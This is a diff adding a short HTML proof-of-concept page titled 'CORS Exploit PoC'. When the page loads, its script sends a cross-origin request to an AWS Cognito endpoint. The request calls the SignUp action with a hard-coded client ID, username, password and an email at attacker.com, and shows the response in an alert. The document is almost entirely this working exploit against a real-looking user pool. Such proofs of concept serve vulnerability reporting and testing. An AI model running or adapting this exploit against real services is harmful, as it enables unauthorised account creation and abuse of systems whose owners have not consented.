@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS Exploit PoC</h2>
+    <script>
+      fetch("https://cognito-idp.sa-east-1.amazonaws.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-amz-json-1.1",
+          "X-Amz-Target": "AWSCognitoIdentityProviderService.SignUp"
+        },
+        body: JSON.stringify({
+          ClientId: "2h2spdqaft80q2o5l5r52h3e7l",
+          Username: "corspoc2025",
+          Password: "Secure123@!",
+          UserAttributes: [
+            {
+              Name: "email",
+              Value: "cors@attacker.com"
+            }
+          ]
+        })
+      }).then(res => res.text()).then(alert);
+    </script>
+  </body>
+</html>
